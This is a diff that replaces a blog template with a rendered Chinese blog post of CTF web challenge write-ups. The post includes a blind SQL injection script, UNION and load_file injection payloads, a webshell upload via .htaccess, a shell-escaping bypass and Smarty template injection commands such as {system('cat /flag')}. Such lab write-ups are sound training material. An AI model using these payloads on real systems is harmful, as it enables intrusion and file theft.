@@ -1,32 +1,322 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>快乐寒假3 | 吴豪滨的地宫</title><meta name="keywords" content="CTF"><meta name="author" content="吴豪滨"><meta name="copyright" content="吴豪滨"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="你👱🏻‍滴寒假本来似上分滴time但是你👱🏻‍打两天多少沾点坐牢,还是滚回来做题了‍ [CISCN2019 华北赛区 Day2 Web1]Hack World你👱🏻‍输入1或者2的时候比较特殊,其他都返回错误 字母返回bool(false) 多次尝试发现过滤了union、and、or、空格等，包括&#x2F;**&#x2F;,但是输入1&#x2F;1和2&#x2F;2的时候会返回跟输入1相同的结果 1和2返回结果不同,你👱">
+<meta property="og:type" content="article">
+<meta property="og:title" content="快乐寒假3">
+<meta property="og:url" content="http://example.com/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/index.html">
+<meta property="og:site_name" content="吴豪滨的地宫">
+<meta property="og:description" content="你👱🏻‍滴寒假本来似上分滴time但是你👱🏻‍打两天多少沾点坐牢,还是滚回来做题了‍ [CISCN2019 华北赛区 Day2 Web1]Hack World你👱🏻‍输入1或者2的时候比较特殊,其他都返回错误 字母返回bool(false) 多次尝试发现过滤了union、and、or、空格等，包括&#x2F;**&#x2F;,但是输入1&#x2F;1和2&#x2F;2的时候会返回跟输入1相同的结果 1和2返回结果不同,你👱">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/02/08/LUMTIignN3mu2jb.jpg">
+<meta property="article:published_time" content="2022-02-06T05:37:52.000Z">
+<meta property="article:modified_time" content="2022-02-27T08:51:47.233Z">
+<meta property="article:author" content="吴豪滨">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/02/08/LUMTIignN3mu2jb.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '快乐寒假3',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-27 16:51:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="吴豪滨的地宫" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/11/02/QcqvSFhZDRg5b7o.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/02/08/LUMTIignN3mu2jb.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">吴豪滨的地宫</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">快乐寒假3</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-06T05:37:52.000Z" title="发表于 2022-02-06 13:37:52">2022-02-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-27T08:51:47.233Z" title="更新于 2022-02-27 16:51:47">2022-02-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="快乐寒假3"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>你👱🏻‍滴寒假本来似上分滴time</strong><br><strong>但是你👱🏻‍打两天多少沾点坐牢,还是滚回来做题了‍</strong></p>
+<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>你👱🏻‍输入1或者2的时候比较特殊,其他都返回错误</p>
+<p>字母返回bool(false)</p>
+<p>多次尝试发现过滤了union、and、or、空格等，包括/**/,但是输入1/1和2/2的时候会返回跟输入1相同的结果</p>
+<p>1和2返回结果不同,<br>你👱🏻‍觉得可能是布尔盲注,()没有过滤,可以使用大部分函数</p>
+<pre><code>import requests
+import string
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+def blind_injection(url):
+flag = &#39;&#39;
+strings = string.printable
+for num in range(1,60):
+    for i in strings:
+        payload = &#39;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#39;.format(num,ord(i))
+        post_data = &#123;&quot;id&quot;:payload&#125;
+        res = requests.post(url=url,data=post_data)
+        if &#39;Hello&#39; in res.text:
+            flag += i
+            print(flag)
+        else:
+            continue
+print(flag)
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+if __name__ == &#39;__main__&#39;:
+url = &#39;http://4d9b3e61-c7ab-43b1-831f-945f73a545ff.node4.buuoj.cn:81/index.php&#39;
+blind_injection(url)
+</code></pre>
+<p>你👱🏻‍这里偷了一个脚本,原理就是盲注</p>
+<p>跑一下就得到flag了</p>
+<p>但是跑的很慢</p>
+<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>你👱🏻‍进入环境,点进去一看</p>
+<p><img src="https://s2.loli.net/2022/02/06/4rdJWAniN5oR139.png"></p>
+<p>这里注册的时候blog需要为一个网址形式</p>
+<p><img src="https://s2.loli.net/2022/02/06/8o9ETY6eOR2aZ4D.png"></p>
+<p>点击用户名滚进去</p>
+<p>其中的url为 </p>
+<pre><code>http://fda8e00b-199c-4f4f-90c7-bbd7ff20c070.node4.buuoj.cn:81/view.php?no=1
+</code></pre>
+<p>你👱🏻‍感觉也许能注入,开整</p>
+<pre><code>?no = 1 and 1=1 回显正常
+
+?no = 1 and 1=2 回显错误
+</code></pre>
+<p>数字型注入,看看多少列捏</p>
+<pre><code>?no = 1 order by 3 正常
+
+?no = 1 order by 4 正常
+
+?no = 1 order by 5 错误
+</code></pre>
+<p>有4列</p>
+<p>尝试union联合注入</p>
+<pre><code>?no = -1 union select 1,2,3,4--+
+</code></pre>
+<p>然后你👱🏻‍就被逮到了</p>
+<p>   <img src="https://s2.loli.net/2022/02/06/tO6CPJxq2XUhsmn.png"></p>
+<p>再试试</p>
+<pre><code>?no=0/**/union/**/select 1,2,3,4#
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/06/jUG1DvrJWPuFLto.png"></p>
+<p>username是回显位</p>
+<pre><code>?no=0/**/union/**/select 1,database(),3,4--+
+</code></pre>
+<p>查数据库名</p>
+<pre><code>?no=0/**/union/**/select 1,user(),3,4--+
+</code></pre>
+<p>查数据库信息位为root@localhost,我趣,是root权限</p>
+<p>那么我们这里可以使用load_file()函数作为一个绝对路径去加载一个文件</p>
+<p>但是你👱🏻‍不知道flag在哪,不过根据前面的报错能猜到网站的目录结构</p>
+<p>flag应该就是在/var/www/html/flag.php</p>
+<p>于是你👱🏻‍</p>
+<pre><code> ?no=0/**/union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/06/gzSe9Vy5T8qYvkl.png"></p>
+<p>找到flag</p>
+<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>这道题是文件上传题</p>
+<p>png文件不让你👱🏻‍上传 jpg可以</p>
+<p>你👱🏻‍先试着遍历上传.htacess和.user.ini,发现还是不行,你👱🏻‍觉得大概要看看源码</p>
+<p>源码要求上传图片文件小于2kb,沾点🐶</p>
+<p>经过你👱🏻‍测试,这道题还卡的有Content-Type</p>
+<p>需要其为image/jpeg才行</p>
+<p>文件内容中不允许出现&lt;?</p>
+<p>所以首先你👱🏻‍上传一个.htacess配置文件,允许服务器把123.jpg解析为php</p>
+<p>然后紧接着上传一个图片🐴<br> <a target="_blank" rel="noopener" href="http://116908e7-0a99-46cf-91bf-8992e0ee771d.node4.buuoj.cn:81/upload/627c1e636b4498e1d54ba6731b549001/123.jpg">http://116908e7-0a99-46cf-91bf-8992e0ee771d.node4.buuoj.cn:81/upload/627c1e636b4498e1d54ba6731b549001/123.jpg</a></p>
+<p>使用蚁⚔️连接得到flag</p>
+<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>你👱🏻‍打开是这样</p>
+<p><img src="https://s2.loli.net/2022/02/06/hQGUFRP2uCrO5dT.png"></p>
+<p>help既然能点 看看什么样子</p>
+<p>打开只有一句</p>
+<pre><code>java.io.FileNotFoundException:&#123;help.docx&#125;
+</code></pre>
+<p>你👱🏻‍以前没怎么接触过java的这种,所以去看了下这是什么情况</p>
+<p>这个大概是报错信息</p>
+<p>打开burp截取请求信息为</p>
+<pre><code> GET /Download?filename=help.docx HTTP/1.1
+ Host: 81681c2a-c10d-4a98-a130-e65f93277e02.node4.buuoj.cn:81
+ Upgrade-Insecure-Requests: 1
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+ Referer: http://81681c2a-c10d-4a98-a130-e65f93277e02.node4.buuoj.cn:81/
+ Accept-Encoding: gzip, deflate
+ Accept-Language: zh-CN,zh;q=0.9
+ Cookie: JSESSIONID=88F4F031FD9E56EAC2188F22D45E1379
+ Connection: close
+</code></pre>
+<p>还是没什么头绪</p>
+<p>通过查询知道要改成POST,而且这类可能涉及到WEB-INF/web.xml泄露</p>
+<p>这里直接用别银的截图</p>
+<p><img src="https://img2020.cnblogs.com/blog/1960851/202006/1960851-20200615102814562-524792465.png"></p>
+<p>这里POST上去得到了一些信息</p>
+<p><img src="https://s2.loli.net/2022/02/06/WaiqJjtmYUh2QwR.png"></p>
+<p>再访问一下WEB-INF/web.xml这个文件</p>
+<p><img src="https://s2.loli.net/2022/02/06/UyQY1LnchCRNIuA.png"></p>
+<p>用同样的方法,这里可以看到flag的地址</p>
+<p><img src="https://s2.loli.net/2022/02/06/KgjVsxm3tRyfUbq.png"></p>
+<p>得到文件路径</p>
+<p><img src="https://s2.loli.net/2022/02/06/ETzUtaHmpFZGjBl.png"></p>
+<p>找到这里base64加密的编码然后解密</p>
+<p>你👱🏻‍这种题属于是你👱🏻‍第一次遇到</p>
+<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p><img src="https://s2.loli.net/2022/02/06/RMSi1ZyLm7oXq34.png"></p>
+<p>你👱🏻‍打开就是代码审计</p>
+<p>escapeshellarg和escapeshellcmd属于是你👱🏻‍第一次见</p>
+<p>escapeshellarg是什么东西呢 他的作用就是将单引号转义 并将转义后的单引号的前后两部分再用一个单引号括上,比如</p>
+<pre><code>123&#39; ls ---&gt; &#39;123&#39;\&#39;&#39; ls&#39;
+</code></pre>
+<p>要注意引号和空格的位置</p>
+<p>escapeshellcmd</p>
+<p>这个玩意就是在&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF和没有配对的单引号前插入”” 但是要注意是没有配对的单引号,比如</p>
+<pre><code>&#39;123&#39;\&#39;&#39; ls&#39; ---&gt; &#39;123&#39;\\&#39;&#39; ls\&#39;
+</code></pre>
+<p>在例子里,只有最后的那一个单引号是没有配对的,中间的那两个在一起的其实是配对了</p>
+<p>这两个函数放一起会沾点问题</p>
+<pre><code> 1. 传入的参数是：172.17.0.2&#39; -v -d a=1
+ 2. 经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
+ 3. 经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
+ 4. 最后执行的命令是curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#39;，即向172.17.0.2\发起请求，POST 数据为a=1&#39;。
+</code></pre>
+<p>总而言之就是两次转译后出现了问题,而没有考虑到单引号的情况。</p>
+<p>现在你👱🏻‍发现了 这道题又是新type</p>
+<p>后面有个system执行命令所以要利用到</p>
+<p>这里本意是希望我们输入ip做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们知道了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
+<p>常见的比如| &amp; &amp;&amp;这样的注入都是不行的,虽然我们能通过上面的操作逃过单引号,但是最后结果任然有\来转移,这个时候你👱🏻‍沾点无奈,只能想想nmap能整什么活</p>
+<p>你👱🏻‍search后发现,nmap命令中有一个参数-oG可以实现命令和结果写到文件,那这就有活可以整了,于是写出payload</p>
+<p><img src="https://s2.loli.net/2022/02/07/8Vy42KWevUYkxIT.png"></p>
+<p>最后利用蚁剑连接找到flag</p>
+<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>你👱🏻‍初步怀疑跟XFF有关,换成127.0.0.1发现也跟着变,说明是可变的,可能存在模板注入,你👱🏻‍后面search了一下发现可能是Smarty模板注入,</p>
+<p><img src="https://s2.loli.net/2022/02/07/TmJECVFg3hiUkn5.png"></p>
+<p>尝试{system(‘ls’)}没有任何过滤</p>
+<p>哦豁爽咯,再试试{system(‘cat /flag’)}</p>
+<p>也没有过滤,直接拿下</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">吴豪滨</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/">http://example.com/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">吴豪滨的地宫</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/02/08/LUMTIignN3mu2jb.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/10/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%874/"><img class="prev-cover" src="https://s2.loli.net/2022/02/08/ia9UBKSlbjgFZEs.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">快乐寒假4</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/15/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%872/"><img class="next-cover" src="https://s2.loli.net/2022/01/24/M1KgnZSfCyH2Rcj.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">快乐寒假2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/23/DASCTF%202022/" title="DASCTF 2022"><img class="cover" src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-23</div><div class="title">DASCTF 2022</div></div></a></div><div><a href="/2021/11/02/badmac/" title="badmac"><img class="cover" src="https://i.loli.net/2021/11/09/gRnKyC1ztL7PIDH.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-02</div><div class="title">badmac</div></div></a></div><div><a href="/2021/11/06/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%981/" title="你爹刷题1"><img class="cover" src="https://i.loli.net/2021/11/09/SaopgqOWJmMT6cE.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-06</div><div class="title">你爹刷题1</div></div></a></div><div><a href="/2022/02/28/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%982/" title="你爹刷题2"><img class="cover" src="https://s2.loli.net/2022/02/28/DchyG29YqFBAfJR.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-28</div><div class="title">你爹刷题2</div></div></a></div><div><a href="/2022/03/01/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%983/" title="你爹刷题3"><img class="cover" src="https://img1.baidu.com/it/u=3722771254,1462812708&fm=253&fmt=auto&app=138&f=JPEG?w=370&h=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-01</div><div class="title">你爹刷题3</div></div></a></div><div><a href="/2022/03/04/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%984/" title="你爹刷题4"><img class="cover" src="https://img1.baidu.com/it/u=3722771254,1462812708&fm=253&fmt=auto&app=138&f=JPEG?w=370&h=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-04</div><div class="title">你爹刷题4</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/11/02/QcqvSFhZDRg5b7o.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">吴豪滨</div><div class="author-info__description">我是你爹</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">快滚去学</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">2.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">3.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">4.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">5.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-number">6.</span> <span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/15/hello-world/" title="Hello World"><img src="https://i.loli.net/2021/11/09/gRnKyC1ztL7PIDH.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/11/15/hello-world/" title="Hello World">Hello World</a><time datetime="2022-11-15T06:59:06.203Z" title="发表于 2022-11-15 14:59:06">2022-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/10/%E6%9C%80%E7%BB%88%E6%B1%87%E6%8A%A5/" title="最终汇报"><img src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="最终汇报"/></a><div class="content"><a class="title" href="/2022/06/10/%E6%9C%80%E7%BB%88%E6%B1%87%E6%8A%A5/" title="最终汇报">最终汇报</a><time datetime="2022-06-10T06:15:21.000Z" title="发表于 2022-06-10 14:15:21">2022-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/23/DASCTF%202022/" title="DASCTF 2022"><img src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" 